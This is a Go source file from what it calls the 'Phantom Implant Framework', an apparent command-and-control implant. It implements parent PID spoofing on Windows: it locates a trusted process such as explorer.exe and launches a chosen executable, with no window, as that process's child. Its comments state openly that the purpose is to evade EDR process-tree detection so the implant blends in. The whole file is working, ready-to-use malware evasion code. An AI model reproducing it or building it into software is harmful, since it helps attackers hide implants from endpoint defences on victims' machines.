package evasion

/*
	Phantom Implant Framework - Parent PID Spoofing
	Makes the implant process appear as a child of a legitimate
	Windows process (e.g. explorer.exe, svchost.exe).

	Why this matters:
	  EDR products build process trees to detect suspicious parent-child
	  relationships (e.g. Word spawning cmd.exe). By spoofing the parent
	  PID to a trusted process, the implant blends into normal process trees.

	Technique:
	  1. Open a handle to the target parent process
	  2. Create a PROC_THREAD_ATTRIBUTE_LIST with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
	  3. CreateProcess with the spoofed parent attribute
*/

import (
	"fmt"
	"strings"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

var (
	kernel32                    = windows.NewLazySystemDLL("kernel32.dll")
	procCreateProcessW          = kernel32.NewProc("CreateProcessW")
	procInitializeProcThreadAttr = kernel32.NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttr    = kernel32.NewProc("UpdateProcThreadAttribute")
	procDeleteProcThreadAttr    = kernel32.NewProc("DeleteProcThreadAttributeList")
)

const (
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
	EXTENDED_STARTUPINFO_PRESENT         = 0x00080000
)

// SpoofedProcess holds info about a process spawned with a spoofed parent
type SpoofedProcess struct {
	PID    uint32
	Handle windows.Handle
}

// SpawnWithSpoofedParent spawns targetExe with its parent PID set to
// the first running instance of parentName (e.g. "explorer.exe").
// Returns the PID of the newly spawned process.
func SpawnWithSpoofedParent(targetExe string, parentName string) (*SpoofedProcess, error) {
	// Find the parent process PID
	parentPID, err := findProcessPID(parentName)
	if err != nil {
		return nil, fmt.Errorf("parent process %q not found: %w", parentName, err)
	}

	// {{if .Config.Debug}}
	log.Printf("[ppid] Spoofing parent to %s (PID %d)", parentName, parentPID)
	// {{end}}

	// Open parent process handle
	parentHandle, err := windows.OpenProcess(
		windows.PROCESS_CREATE_PROCESS,
		false,
		parentPID,
	)
	if err != nil {
		return nil, fmt.Errorf("OpenProcess failed for PID %d: %w", parentPID, err)
	}
	defer windows.CloseHandle(parentHandle)

	// Allocate PROC_THREAD_ATTRIBUTE_LIST
	var attrListSize uintptr
	procInitializeProcThreadAttr.Call(0, 1, 0, uintptr(unsafe.Pointer(&attrListSize)))
	attrList := make([]byte, attrListSize)

	ret, _, err := procInitializeProcThreadAttr.Call(
		uintptr(unsafe.Pointer(&attrList[0])),
		1,
		0,
		uintptr(unsafe.Pointer(&attrListSize)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("InitializeProcThreadAttributeList failed: %w", err)
	}
	defer procDeleteProcThreadAttr.Call(uintptr(unsafe.Pointer(&attrList[0])))

	// Set parent process attribute
	ret, _, err = procUpdateProcThreadAttr.Call(
		uintptr(unsafe.Pointer(&attrList[0])),
		0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		uintptr(unsafe.Pointer(&parentHandle)),
		unsafe.Sizeof(parentHandle),
		0,
		0,
	)
	if ret == 0 {
		return nil, fmt.Errorf("UpdateProcThreadAttribute failed: %w", err)
	}

	// Build STARTUPINFOEX
	type STARTUPINFOEX struct {
		windows.StartupInfo
		AttributeList uintptr
	}

	si := STARTUPINFOEX{}
	si.Cb = uint32(unsafe.Sizeof(si))
	si.AttributeList = uintptr(unsafe.Pointer(&attrList[0]))

	var pi windows.ProcessInformation

	targetPtr, err := windows.UTF16PtrFromString(targetExe)
	if err != nil {
		return nil, fmt.Errorf("UTF16PtrFromString failed: %w", err)
	}

	ret, _, err = procCreateProcessW.Call(
		uintptr(unsafe.Pointer(targetPtr)),
		0,
		0,
		0,
		0,
		uintptr(windows.CREATE_NO_WINDOW|EXTENDED_STARTUPINFO_PRESENT),
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("CreateProcess failed: %w", err)
	}

	// {{if .Config.Debug}}
	log.Printf("[ppid] Spawned %s as PID %d (parent: %s PID %d)", targetExe, pi.ProcessId, parentName, parentPID)
	// {{end}}

	return &SpoofedProcess{
		PID:    pi.ProcessId,
		Handle: pi.Process,
	}, nil
}

// findProcessPID returns the PID of the first running process matching name.
func findProcessPID(name string) (uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %w", err)
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = windows.Process32First(snapshot, &entry)
	for err == nil {
		procName := windows.UTF16ToString(entry.ExeFile[:])
		if strings.EqualFold(procName, name) {
			return entry.ProcessID, nil
		}
		err = windows.Process32Next(snapshot, &entry)
	}

	return 0, fmt.Errorf("process %q not found", name)
}
